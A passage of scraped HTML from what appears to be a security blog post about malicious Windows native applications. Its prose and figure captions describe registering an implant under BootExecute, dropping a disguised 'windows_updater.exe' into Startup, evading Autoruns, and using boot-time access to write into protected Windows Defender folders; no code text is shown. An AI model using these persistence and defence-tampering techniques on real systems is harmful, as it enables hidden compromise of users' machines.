of the executable inside of the System32 directory:</span></span></p></div><div type="paragraph" data-hook="rcv-block147"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-ro1al5286"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block148"></div><div data-breakout="normal"><div class="i5TUk" id="viewer-12jac5395"><div class="J9Vi9"><figure class="OPDJf" data-hook="figure-IMAGE"><a class="Vxa2D has-custom-focus LBfZl" tabindex="0" target="_self"><div data-hook="image-viewer" class="fnfJM"><div style="--dim-height:294;--dim-width:740;--ricos-image-default-border-color:unset" id="12jac5395" class="_49X-U wNivC _8xVnn" data-hook="image-viewer-12jac5395"><wow-image id="0628ff_51b3a29b892a42b6b2445f892113debb~mv2.webp" class="undefined tKegW" data-image-info="{&quot;containerId&quot;:&quot;12jac5395&quot;,&quot;alignType&quot;:&quot;center&quot;,&quot;displayMode&quot;:&quot;fill&quot;,&quot;isLQIP&quot;:true,&quot;isSEOBot&quot;:false,&quot;lqipTransition&quot;:&quot;blur&quot;,&quot;encoding&quot;:&quot;AVIF&quot;,&quot;imageData&quot;:{&quot;width&quot;:740,&quot;height&quot;:294,&quot;uri&quot;:&quot;0628ff_51b3a29b892a42b6b2445f892113debb~mv2.webp&quot;,&quot;name&quot;:&quot;&quot;,&quot;displayMode&quot;:&quot;fill&quot;}}" data-motion-part="BG_IMG 12jac5395" data-bg-effect-name="" data-has-ssr-src="true" data-animate-blur="" data-is-responsive="true"><img src="https://static.wixstatic.com/media/0628ff_51b3a29b892a42b6b2445f892113debb~mv2.webp/v1/fill/w_133,h_53,al_c,q_80,usm_0.66_1.00_0.01,blur_2,enc_avif,quality_auto/0628ff_51b3a29b892a42b6b2445f892113debb~mv2.webp" alt="" style="width:100%;height:100%;object-fit:cover;object-position:50% 50%;max-width:100%;position:absolute;left:0;top:0" data-pin-url="https://www.protexity.com/post/going-native-malicious-native-applications" data-pin-media="https://static.wixstatic.com/media/0628ff_51b3a29b892a42b6b2445f892113debb~mv2.webp/v1/fill/w_888,h_353,al_c,lg_1,q_80/0628ff_51b3a29b892a42b6b2445f892113debb~mv2.webp" draggable="false"></wow-image></div><button class="KxJvA" type="button" data-hook="image-expand-button" aria-label="Expand image"><svg viewBox="0 0 19 19" xmlns="http://www.w3.org/2000/svg" class="C02F9"><path d="M15.071 8.371V4.585l-4.355 4.356a.2.2 0 0 1-.283 0l-.374-.374a.2.2 0 0 1 0-.283l4.356-4.355h-3.786a.2.2 0 0 1-.2-.2V3.2c0-.11.09-.2.2-.2H16v5.371a.2.2 0 0 1-.2.2h-.529a.2.2 0 0 1-.2-.2zm-6.5 6.9v.529a.2.2 0 0 1-.2.2H3v-5.371c0-.11.09-.2.2-.2h.529c.11 0 .2.09.2.2v3.786l4.355-4.356a.2.2 0 0 1 .283 0l.374.374a.2.2 0 0 1 0 .283L4.585 15.07h3.786c.11 0 .2.09.2.2z" fill="#000" fill-rule="nonzero"></path></svg></button></div></a></figure></div></div></div><div type="image" data-hook="rcv-block149"></div><div data-breakout="normal"><p class="Rc39c HhrTy RISpW X7MWW" dir="auto" id="viewer-g21pb5503"><span class="vMus0"><span style="font-size:14px"><span>Figure 15 - We setup our native_implant executable to run as part of the BootExecute entries</span></span></span></p></div><div type="paragraph" data-hook="rcv-block150"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-bw7iq15317"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block151"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-v5tbq618634"><span class="vMus0"><span>Now to trigger our implant, we restart the target system. Remember, we’re calling NtDrawText so during boot we should see a screen similar to the one below:</span></span></p></div><div type="paragraph" data-hook="rcv-block152"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-2c2kw50288"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block153"></div><div data-breakout="normal"><div class="i5TUk" id="viewer-34zkj5827"><div class="J9Vi9"><figure class="OPDJf" data-hook="figure-IMAGE"><a class="Vxa2D has-custom-focus LBfZl" tabindex="0" target="_self"><div data-hook="image-viewer" class="fnfJM"><div style="--dim-height:269;--dim-width:740;--ricos-image-default-border-color:unset" id="34zkj5827" class="_49X-U wNivC _8xVnn" data-hook="image-viewer-34zkj5827"><wow-image id="0628ff_fb51bfd14657493088d60aabae3ce1b4~mv2.webp" class="undefined tKegW" data-image-info="{&quot;containerId&quot;:&quot;34zkj5827&quot;,&quot;alignType&quot;:&quot;center&quot;,&quot;displayMode&quot;:&quot;fill&quot;,&quot;isLQIP&quot;:true,&quot;isSEOBot&quot;:false,&quot;lqipTransition&quot;:&quot;blur&quot;,&quot;encoding&quot;:&quot;AVIF&quot;,&quot;imageData&quot;:{&quot;width&quot;:740,&quot;height&quot;:269,&quot;uri&quot;:&quot;0628ff_fb51bfd14657493088d60aabae3ce1b4~mv2.webp&quot;,&quot;name&quot;:&quot;&quot;,&quot;displayMode&quot;:&quot;fill&quot;}}" data-motion-part="BG_IMG 34zkj5827" data-bg-effect-name="" data-has-ssr-src="true" data-animate-blur="" data-is-responsive="true"><img src="https://static.wixstatic.com/media/0628ff_fb51bfd14657493088d60aabae3ce1b4~mv2.webp/v1/fill/w_133,h_48,al_c,q_80,usm_0.66_1.00_0.01,blur_2,enc_avif,quality_auto/0628ff_fb51bfd14657493088d60aabae3ce1b4~mv2.webp" alt="" style="width:100%;height:100%;object-fit:cover;object-position:50% 50%;max-width:100%;position:absolute;left:0;top:0" data-pin-url="https://www.protexity.com/post/going-native-malicious-native-applications" data-pin-media="https://static.wixstatic.com/media/0628ff_fb51bfd14657493088d60aabae3ce1b4~mv2.webp/v1/fill/w_888,h_323,al_c,lg_1,q_80/0628ff_fb51bfd14657493088d60aabae3ce1b4~mv2.webp" draggable="false"></wow-image></div><button class="KxJvA" type="button" data-hook="image-expand-button" aria-label="Expand image"><svg viewBox="0 0 19 19" xmlns="http://www.w3.org/2000/svg" class="C02F9"><path d="M15.071 8.371V4.585l-4.355 4.356a.2.2 0 0 1-.283 0l-.374-.374a.2.2 0 0 1 0-.283l4.356-4.355h-3.786a.2.2 0 0 1-.2-.2V3.2c0-.11.09-.2.2-.2H16v5.371a.2.2 0 0 1-.2.2h-.529a.2.2 0 0 1-.2-.2zm-6.5 6.9v.529a.2.2 0 0 1-.2.2H3v-5.371c0-.11.09-.2.2-.2h.529c.11 0 .2.09.2.2v3.786l4.355-4.356a.2.2 0 0 1 .283 0l.374.374a.2.2 0 0 1 0 .283L4.585 15.07h3.786c.11 0 .2.09.2.2z" fill="#000" fill-rule="nonzero"></path></svg></button></div></a></figure></div></div></div><div type="image" data-hook="rcv-block154"></div><div data-breakout="normal"><p class="Rc39c HhrTy RISpW X7MWW" dir="auto" id="viewer-tth8v5937"><span class="vMus0"><span style="font-size:14px"><span>Figure 16 - Our call to NtDrawText succeeds during boot</span></span></span></p></div><div type="paragraph" data-hook="rcv-block155"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-r31x015322"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block156"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-u34n3639552"><span class="vMus0"><span>Once we login, we should receive a calculator, and upon inspection of the Startup directory, we also find our “windows_updater.exe” executable:</span></span></p></div><div type="paragraph" data-hook="rcv-block157"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-zktb451896"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block158"></div><div data-breakout="normal"><div class="i5TUk" id="viewer-2lcoa6267"><div class="J9Vi9"><figure class="OPDJf" data-hook="figure-IMAGE"><a class="Vxa2D has-custom-focus LBfZl" tabindex="0" target="_self"><div data-hook="image-viewer" class="fnfJM"><div style="--dim-height:212;--dim-width:740;--ricos-image-default-border-color:unset" id="2lcoa6267" class="_49X-U wNivC _8xVnn" data-hook="image-viewer-2lcoa6267"><wow-image id="0628ff_a757c902ad1c4d18b1b7dfb7fd35d2fd~mv2.webp" class="undefined tKegW" data-image-info="{&quot;containerId&quot;:&quot;2lcoa6267&quot;,&quot;alignType&quot;:&quot;center&quot;,&quot;displayMode&quot;:&quot;fill&quot;,&quot;isLQIP&quot;:true,&quot;isSEOBot&quot;:false,&quot;lqipTransition&quot;:&quot;blur&quot;,&quot;encoding&quot;:&quot;AVIF&quot;,&quot;imageData&quot;:{&quot;width&quot;:740,&quot;height&quot;:212,&quot;uri&quot;:&quot;0628ff_a757c902ad1c4d18b1b7dfb7fd35d2fd~mv2.webp&quot;,&quot;name&quot;:&quot;&quot;,&quot;displayMode&quot;:&quot;fill&quot;}}" data-motion-part="BG_IMG 2lcoa6267" data-bg-effect-name="" data-has-ssr-src="true" data-animate-blur="" data-is-responsive="true"><img src="https://static.wixstatic.com/media/0628ff_a757c902ad1c4d18b1b7dfb7fd35d2fd~mv2.webp/v1/fill/w_133,h_38,al_c,q_80,usm_0.66_1.00_0.01,blur_2,enc_avif,quality_auto/0628ff_a757c902ad1c4d18b1b7dfb7fd35d2fd~mv2.webp" alt="" style="width:100%;height:100%;object-fit:cover;object-position:50% 50%;max-width:100%;position:absolute;left:0;top:0" data-pin-url="https://www.protexity.com/post/going-native-malicious-native-applications" data-pin-media="https://static.wixstatic.com/media/0628ff_a757c902ad1c4d18b1b7dfb7fd35d2fd~mv2.webp/v1/fill/w_1036,h_297,al_c,lg_1,q_80/0628ff_a757c902ad1c4d18b1b7dfb7fd35d2fd~mv2.webp" draggable="false"></wow-image></div><button class="KxJvA" type="button" data-hook="image-expand-button" aria-label="Expand image"><svg viewBox="0 0 19 19" xmlns="http://www.w3.org/2000/svg" class="C02F9"><path d="M15.071 8.371V4.585l-4.355 4.356a.2.2 0 0 1-.283 0l-.374-.374a.2.2 0 0 1 0-.283l4.356-4.355h-3.786a.2.2 0 0 1-.2-.2V3.2c0-.11.09-.2.2-.2H16v5.371a.2.2 0 0 1-.2.2h-.529a.2.2 0 0 1-.2-.2zm-6.5 6.9v.529a.2.2 0 0 1-.2.2H3v-5.371c0-.11.09-.2.2-.2h.529c.11 0 .2.09.2.2v3.786l4.355-4.356a.2.2 0 0 1 .283 0l.374.374a.2.2 0 0 1 0 .283L4.585 15.07h3.786c.11 0 .2.09.2.2z" fill="#000" fill-rule="nonzero"></path></svg></button></div></a></figure></div></div></div><div type="image" data-hook="rcv-block159"></div><div data-breakout="normal"><p class="Rc39c HhrTy RISpW X7MWW" dir="auto" id="viewer-nfu386379"><span class="vMus0"><span style="font-size:14px"><span>Figure 17 - Our Native Application works!</span></span></span></p></div><div type="paragraph" data-hook="rcv-block160"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-0ackn15327"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block161"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-as85t650056"><span class="vMus0"><span>It's important to note here, that during my testing I found that the most up to date version of Autoruns from Sysinternals was not able to capture the changes I made to the BootExecute registry entry or any entries in BootExecute:</span></span></p></div><div type="paragraph" data-hook="rcv-block162"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-986ar53504"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block163"></div><div data-breakout="normal"><div class="i5TUk" id="viewer-g3csy6715"><div class="J9Vi9"><figure class="OPDJf" data-hook="figure-IMAGE"><a class="Vxa2D has-custom-focus LBfZl" tabindex="0" target="_self"><div data-hook="image-viewer" class="fnfJM"><div style="--dim-height:190;--dim-width:740;--ricos-image-default-border-color:unset" id="g3csy6715" class="_49X-U wNivC _8xVnn" data-hook="image-viewer-g3csy6715"><wow-image id="0628ff_37e2baa310b748eda466d5665158b04f~mv2.webp" class="undefined tKegW" data-image-info="{&quot;containerId&quot;:&quot;g3csy6715&quot;,&quot;alignType&quot;:&quot;center&quot;,&quot;displayMode&quot;:&quot;fill&quot;,&quot;isLQIP&quot;:true,&quot;isSEOBot&quot;:false,&quot;lqipTransition&quot;:&quot;blur&quot;,&quot;encoding&quot;:&quot;AVIF&quot;,&quot;imageData&quot;:{&quot;width&quot;:740,&quot;height&quot;:190,&quot;uri&quot;:&quot;0628ff_37e2baa310b748eda466d5665158b04f~mv2.webp&quot;,&quot;name&quot;:&quot;&quot;,&quot;displayMode&quot;:&quot;fill&quot;}}" data-motion-part="BG_IMG g3csy6715" data-bg-effect-name="" data-has-ssr-src="true" data-animate-blur="" data-is-responsive="true"><img src="https://static.wixstatic.com/media/0628ff_37e2baa310b748eda466d5665158b04f~mv2.webp/v1/fill/w_133,h_34,al_c,q_80,usm_0.66_1.00_0.01,blur_2,enc_avif,quality_auto/0628ff_37e2baa310b748eda466d5665158b04f~mv2.webp" alt="" style="width:100%;height:100%;object-fit:cover;object-position:50% 50%;max-width:100%;position:absolute;left:0;top:0" data-pin-url="https://www.protexity.com/post/going-native-malicious-native-applications" data-pin-media="https://static.wixstatic.com/media/0628ff_37e2baa310b748eda466d5665158b04f~mv2.webp/v1/fill/w_1036,h_266,al_c,lg_1,q_80/0628ff_37e2baa310b748eda466d5665158b04f~mv2.webp" draggable="false"></wow-image></div><button class="KxJvA" type="button" data-hook="image-expand-button" aria-label="Expand image"><svg viewBox="0 0 19 19" xmlns="http://www.w3.org/2000/svg" class="C02F9"><path d="M15.071 8.371V4.585l-4.355 4.356a.2.2 0 0 1-.283 0l-.374-.374a.2.2 0 0 1 0-.283l4.356-4.355h-3.786a.2.2 0 0 1-.2-.2V3.2c0-.11.09-.2.2-.2H16v5.371a.2.2 0 0 1-.2.2h-.529a.2.2 0 0 1-.2-.2zm-6.5 6.9v.529a.2.2 0 0 1-.2.2H3v-5.371c0-.11.09-.2.2-.2h.529c.11 0 .2.09.2.2v3.786l4.355-4.356a.2.2 0 0 1 .283 0l.374.374a.2.2 0 0 1 0 .283L4.585 15.07h3.786c.11 0 .2.09.2.2z" fill="#000" fill-rule="nonzero"></path></svg></button></div></a></figure></div></div></div><div type="image" data-hook="rcv-block164"></div><div data-breakout="normal"><p class="Rc39c HhrTy RISpW X7MWW" dir="auto" id="viewer-ictxr6829"><span class="vMus0"><span style="font-size:14px"><span>Figure 18 - Autoruns Boot Execute tab</span></span></span></p></div><div type="paragraph" data-hook="rcv-block165"></div><div data-breakout="normal"><div class="Rc39c HhrTy RISpW X7MWW" dir="auto" id="viewer-xto3j54846"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block166"></div><div data-breakout="normal"><div class="i5TUk" id="viewer-5r0xm7170"><div class="J9Vi9"><figure class="OPDJf" data-hook="figure-IMAGE"><a class="Vxa2D has-custom-focus LBfZl" tabindex="0" target="_self"><div data-hook="image-viewer" class="fnfJM"><div style="--dim-height:273;--dim-width:740;--ricos-image-default-border-color:unset" id="5r0xm7170" class="_49X-U wNivC _8xVnn" data-hook="image-viewer-5r0xm7170"><wow-image id="0628ff_568a0c0300ef41febfd8d88096891020~mv2.webp" class="undefined tKegW" data-image-info="{&quot;containerId&quot;:&quot;5r0xm7170&quot;,&quot;alignType&quot;:&quot;center&quot;,&quot;displayMode&quot;:&quot;fill&quot;,&quot;isLQIP&quot;:true,&quot;isSEOBot&quot;:false,&quot;lqipTransition&quot;:&quot;blur&quot;,&quot;encoding&quot;:&quot;AVIF&quot;,&quot;imageData&quot;:{&quot;width&quot;:740,&quot;height&quot;:273,&quot;uri&quot;:&quot;0628ff_568a0c0300ef41febfd8d88096891020~mv2.webp&quot;,&quot;name&quot;:&quot;&quot;,&quot;displayMode&quot;:&quot;fill&quot;}}" data-motion-part="BG_IMG 5r0xm7170" data-bg-effect-name="" data-has-ssr-src="true" data-animate-blur="" data-is-responsive="true"><img src="https://static.wixstatic.com/media/0628ff_568a0c0300ef41febfd8d88096891020~mv2.webp/v1/fill/w_133,h_49,al_c,q_80,usm_0.66_1.00_0.01,blur_2,enc_avif,quality_auto/0628ff_568a0c0300ef41febfd8d88096891020~mv2.webp" alt="" style="width:100%;height:100%;object-fit:cover;object-position:50% 50%;max-width:100%;position:absolute;left:0;top:0" data-pin-url="https://www.protexity.com/post/going-native-malicious-native-applications" data-pin-media="https://static.wixstatic.com/media/0628ff_568a0c0300ef41febfd8d88096891020~mv2.webp/v1/fill/w_888,h_328,al_c,lg_1,q_80/0628ff_568a0c0300ef41febfd8d88096891020~mv2.webp" draggable="false"></wow-image></div><button class="KxJvA" type="button" data-hook="image-expand-button" aria-label="Expand image"><svg viewBox="0 0 19 19" xmlns="http://www.w3.org/2000/svg" class="C02F9"><path d="M15.071 8.371V4.585l-4.355 4.356a.2.2 0 0 1-.283 0l-.374-.374a.2.2 0 0 1 0-.283l4.356-4.355h-3.786a.2.2 0 0 1-.2-.2V3.2c0-.11.09-.2.2-.2H16v5.371a.2.2 0 0 1-.2.2h-.529a.2.2 0 0 1-.2-.2zm-6.5 6.9v.529a.2.2 0 0 1-.2.2H3v-5.371c0-.11.09-.2.2-.2h.529c.11 0 .2.09.2.2v3.786l4.355-4.356a.2.2 0 0 1 .283 0l.374.374a.2.2 0 0 1 0 .283L4.585 15.07h3.786c.11 0 .2.09.2.2z" fill="#000" fill-rule="nonzero"></path></svg></button></div></a></figure></div></div></div><div type="image" data-hook="rcv-block167"></div><div data-breakout="normal"><p class="Rc39c HhrTy RISpW X7MWW" dir="auto" id="viewer-48ra77285"><span class="vMus0"><span style="font-size:14px"><span>Figure 19 - Autoruns Everything tab</span></span></span></p></div><div type="paragraph" data-hook="rcv-block168"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-8hbdu725098"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block169"></div><div data-breakout="normal"><h3 class="CwsM- nAEMg Z7lok X7MWW" dir="auto" id="viewer-94aw315335"><span class="-pTyw"><strong style="font-weight:700"><span style="font-size:18px"><span style="color:#fd6262;text-decoration:inherit"><span>Writing Bad Things</span></span></span></strong></span></h3></div><div type="heading" data-hook="rcv-block170"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-fdi2n15337"><span class="vMus0"><span>Another interesting thing we can do with our early boot access, is read and write from/to files and directories that we normally wouldn’t be able to access. These permissions are not absolute, but greatly extend the capabilities of our executable.</span></span></p></div><div type="paragraph" data-hook="rcv-block171"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-w1rl315339"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block172"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-y4m23745193"><span class="vMus0"><span>For example, the directories and sub-directories of Windows Defender have very robust permissions in place that prevent even Administrator access from writing to these locations:</span></span></p></div><div type="paragraph" data-hook="rcv-block173"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-fovjk56728"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block174"></div><div data-breakout="normal"><div class="i5TUk" id="viewer-sjzbs7632"><div class="J9Vi9"><figure class="OPDJf" data-hook="figure-IMAGE"><a class="Vxa2D has-custom-focus LBfZl" tabindex="0" target="_self"><div data-hook="image-viewer" class="fnfJM"><div style="--dim-height:305;--dim-width:740;--ricos-image-default-border-color:unset" id="sjzbs7632" class="_49X-U wNivC _8xVnn" data-hook="image-viewer-sjzbs7632"><wow-image id="0628ff_f7e8330d809d4ea29333370cb6dd47c4~mv2.webp" class="undefined tKegW" data-image-info="{&quot;containerId&quot;:&quot;sjzbs7632&quot;,&quot;alignType&quot;:&quot;center&quot;,&quot;displayMode&quot;:&quot;fill&quot;,&quot;isLQIP&quot;:true,&quot;isSEOBot&quot;:false,&quot;lqipTransition&quot;:&quot;blur&quot;,&quot;encoding&quot;:&quot;AVIF&quot;,&quot;imageData&quot;:{&quot;width&quot;:740,&quot;height&quot;:305,&quot;uri&quot;:&quot;0628ff_f7e8330d809d4ea29333370cb6dd47c4~mv2.webp&quot;,&quot;name&quot;:&quot;&quot;,&quot;displayMode&quot;:&quot;fill&quot;}}" data-motion-part="BG_IMG sjzbs7632" data-bg-effect-name="" data-has-ssr-src="true" data-animate-blur="" data-is-responsive="true"><img src="https://static.wixstatic.com/media/0628ff_f7e8330d809d4ea29333370cb6dd47c4~mv2.webp/v1/fill/w_133,h_55,al_c,q_80,usm_0.66_1.00_0.01,blur_2,enc_avif,quality_auto/0628ff_f7e8330d809d4ea29333370cb6dd47c4~mv2.webp" alt="" style="width:100%;height:100%;object-fit:cover;object-position:50% 50%;max-width:100%;position:absolute;left:0;top:0" data-pin-url="https://www.protexity.com/post/going-native-malicious-native-applications" data-pin-media="https://static.wixstatic.com/media/0628ff_f7e8330d809d4ea29333370cb6dd47c4~mv2.webp/v1/fill/w_888,h_366,al_c,lg_1,q_80/0628ff_f7e8330d809d4ea29333370cb6dd47c4~mv2.webp" draggable="false"></wow-image></div><button class="KxJvA" type="button" data-hook="image-expand-button" aria-label="Expand image"><svg viewBox="0 0 19 19" xmlns="http://www.w3.org/2000/svg" class="C02F9"><path d="M15.071 8.371V4.585l-4.355 4.356a.2.2 0 0 1-.283 0l-.374-.374a.2.2 0 0 1 0-.283l4.356-4.355h-3.786a.2.2 0 0 1-.2-.2V3.2c0-.11.09-.2.2-.2H16v5.371a.2.2 0 0 1-.2.2h-.529a.2.2 0 0 1-.2-.2zm-6.5 6.9v.529a.2.2 0 0 1-.2.2H3v-5.371c0-.11.09-.2.2-.2h.529c.11 0 .2.09.2.2v3.786l4.355-4.356a.2.2 0 0 1 .283 0l.374.374a.2.2 0 0 1 0 .283L4.585 15.07h3.786c.11 0 .2.09.2.2z" fill="#000" fill-rule="nonzero"></path></svg></button></div></a></figure></div></div></div><div type="image" data-hook="rcv-block175"></div><div data-breakout="normal"><p class="Rc39c HhrTy RISpW X7MWW" dir="auto" id="viewer-3cqss7751"><span class="vMus0"><span style="font-size:14px"><span>Figure 20 - Trying to write to the \Windows Defender\Offline directory fails with Administrator permissions</span></span></span></p></div><div type="paragraph" data-hook="rcv-block176"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-629xn15344"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block177"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-b805b758171"><span class="vMus0"><span>These protections are so robust, that even the TrustedInstaller permissions that often give unrestricted access to system resources only grant the ability to list folder contents. And users have read and execute permissions:</span></span></p></div><div type="paragraph" data-hook="rcv-block178"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-3icyh59140"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block179"></div><div data-breakout="normal"><div class="i5TUk" id="viewer-p30sg8229"><div class="J9Vi9 _0Vdej"><figure class="OPDJf" data-hook="figure-IMAGE"><a class="Vxa2D has-custom-focus LBfZl" tabindex="0" target="_self"><div data-hook="image-viewer" class="fnfJM"><div style="--dim-height:474;--dim-width:350;--ricos-image-default-border-color:unset" id="p30sg8229" class="_49X-U wNivC _8xVnn" data-hook="image-viewer-p30sg8229"><wow-image id="0628ff_7e8d6eb1d9564fa9b2282ea84a45e04b~mv2.webp" class="undefined tKegW" data-image-info="{&quot;containerId&quot;:&quot;p30sg8229&quot;,&quot;alignType&quot;:&quot;center&quot;,&quot;displayMode&quot;:&quot;fill&quot;,&quot;isLQIP&quot;:true,&quot;isSEOBot&quot;:false,&quot;lqipTransition&quot;:&quot;blur&quot;,&quot;encoding&quot;:&quot;AVIF&quot;,&quot;imageData&quot;:{&quot;width&quot;:350,&quot;height&quot;:474,&quot;uri&quot;:&quot;0628ff_7e8d6eb1d9564fa9b2282ea84a45e04b~mv2.webp&quot;,&quot;name&quot;:&quot;&quot;,&quot;displayMode&quot;:&quot;fill&quot;}}" data-motion-part="BG_IMG p30sg8229" data-bg-effect-name="" data-has-ssr-src="true" data-animate-blur="" data-is-responsive="true"><img src="https://static.wixstatic.com/media/0628ff_7e8d6eb1d9564fa9b2282ea84a45e04b~mv2.webp/v1/fill/w_88,h_119,al_c,q_80,usm_0.66_1.00_0.01,blur_2,enc_avif,quality_auto/0628ff_7e8d6eb1d9564fa9b2282ea84a45e04b~mv2.webp" alt="" style="width:100%;height:100%;object-fit:cover;object-position:50% 50%;max-width:100%;position:absolute;left:0;top:0" data-pin-url="https://www.protexity.com/post/going-native-malicious-native-applications" data-pin-media="https://static.wixstatic.com/media/0628ff_7e8d6eb1d9564fa9b2282ea84a45e04b~mv2.webp/v1/fill/w_420,h_569,al_c,lg_1,q_80/0628ff_7e8d6eb1d9564fa9b2282ea84a45e04b~mv2.webp" draggable="false"></wow-image></div><button class="KxJvA" type="button" data-hook="image-expand-button" aria-label="Expand image"><svg viewBox="0 0 19 19" xmlns="http://www.w3.org/2000/svg" class="C02F9"><path d="M15.071 8.371V4.585l-4.355 4.356a.2.2 0 0 1-.283 0l-.374-.374a.2.2 0 0 1 0-.283l4.356-4.355h-3.786a.2.2 0 0 1-.2-.2V3.2c0-.11.09-.2.2-.2H16v5.371a.2.2 0 0 1-.2.2h-.529a.2.2 0 0 1-.2-.2zm-6.5 6.9v.529a.2.2 0 0 1-.2.2H3v-5.371c0-.11.09-.2.2-.2h.529c.11 0 .2.09.2.2v3.786l4.355-4.356a.2.2 0 0 1 .283 0l.374.374a.2.2 0 0 1 0 .283L4.585 15.07h3.786c.11 0 .2.09.2.2z" fill="#000" fill-rule="nonzero"></path></svg></button></div></a></figure></div></div></div><div type="image" data-hook="rcv-block180"></div><div data-breakout="normal"><p class="Rc39c HhrTy RISpW X7MWW" dir="auto" id="viewer-k9yja8350"><span class="vMus0"><span style="font-size:14px"><span>Figure 21 - TrustedInstaller permissions for C:\Program Files\Windows Defender\Offline</span></span></span></p></div><div type="paragraph" data-hook="rcv-block181"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-857zv15349"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block182"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-51mw0784897"><span class="vMus0"><span>But what happens if we try to use our BootExec permissions to write a file to the target directory using the same NtAPI calls:</span></span></p></div><div type="paragraph" data-hook="rcv-block183"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-32xdt60749"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block184"></div><div data-breakout="normal"><div class="i5TUk" id="viewer-ini7z8956"><div class="J9Vi9"><figure class="OPDJf" data-hook="figure-IMAGE"><a class="Vxa2D has-custom-focus LBfZl" tabindex="0" target="_self"><div data-hook="image-viewer" class="fnfJM"><div style="--dim-height:221;--dim-width:740;--ricos-image-default-border-color:unset" id="ini7z8956" class="_49X-U wNivC _8xVnn" data-hook="image-viewer-ini7z8956"><wow-image id="0628ff_075ab0be867e45ad9993f2d014b00459~mv2.webp" class="undefined tKegW" data-image-info="{&quot;containerId&quot;:&quot;ini7z8956&quot;,&quot;alignType&quot;:&quot;center&quot;,&quot;displayMode&quot;:&quot;fill&quot;,&quot;isLQIP&quot;:true,&quot;isSEOBot&quot;:false,&quot;lqipTransition&quot;:&quot;blur&quot;,&quot;encoding&quot;:&quot;AVIF&quot;,&quot;imageData&quot;:{&quot;width&quot;:740,&quot;height&quot;:221,&quot;uri&quot;:&quot;0628ff_075ab0be867e45ad9993f2d014b00459~mv2.webp&quot;,&quot;name&quot;:&quot;&quot;,&quot;displayMode&quot;:&quot;fill&quot;}}" data-motion-part="BG_IMG ini7z8956" data-bg-effect-name="" data-has-ssr-src="true" data-animate-blur="" data-is-responsive="true"><img src="https://static.wixstatic.com/media/0628ff_075ab0be867e45ad9993f2d014b00459~mv2.webp/v1/fill/w_133,h_40,al_c,q_80,usm_0.66_1.00_0.01,blur_2,enc_avif,quality_auto/0628ff_075ab0be867e45ad9993f2d014b00459~mv2.webp" alt="" style="width:100%;height:100%;object-fit:cover;object-position:50% 50%;max-width:100%;position:absolute;left:0;top:0" data-pin-url="https://www.protexity.com/post/going-native-malicious-native-applications" data-pin-media="https://static.wixstatic.com/media/0628ff_075ab0be867e45ad9993f2d014b00459~mv2.webp/v1/fill/w_888,h_265,al_c,lg_1,q_80/0628ff_075ab0be867e45ad9993f2d014b00459~mv2.webp" draggable="false"></wow-image></div><button class="KxJvA" type="button" data-hook="image-expand-button" aria-label="Expand image"><svg viewBox="0 0 19 19" xmlns="http://www.w3.org/2000/svg" class="C02F9"><path d="M15.071 8.371V4.585l-4.355 4.356a.2.2 0 0 1-.283 0l-.374-.374a.2.2 0 0 1 0-.283l4.356-4.355h-3.786a.2.2 0 0 1-.2-.2V3.2c0-.11.09-.2.2-.2H16v5.371a.2.2 0 0 1-.2.2h-.529a.2.2 0 0 1-.2-.2zm-6.5 6.9v.529a.2.2 0 0 1-.2.2H3v-5.371c0-.11.09-.2.2-.2h.529c.11 0 .2.09.2.2v3.786l4.355-4.356a.2.2 0 0 1 .283 0l.374.374a.2.2 0 0 1 0 .283L4.585 15.07h3.786c.11 0 .2.09.2.2z" fill="#000" 